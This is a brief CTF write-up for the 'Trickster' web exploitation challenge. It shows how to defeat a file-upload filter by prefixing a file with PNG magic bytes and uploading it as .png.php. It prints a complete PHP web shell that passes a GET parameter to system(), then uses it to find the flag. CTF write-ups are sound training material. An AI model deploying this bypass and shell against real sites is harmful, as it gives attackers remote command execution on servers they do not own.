## Trickster - 300 | Web Exploitation

### Solve :

i solved this challenge after the ctf end  , i know that it was a file upload vuln but the trick was in the header of the file u just need to put first bytes to `50 4E 47` or just type PNG in the header of your websheel

u ca n use this 
```
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

and u upload the file as .png.php


after that when u visite the /uploads/name.png.php  u will find command line to type after seach for all extention with *.txt u can find some files one of them with the flag
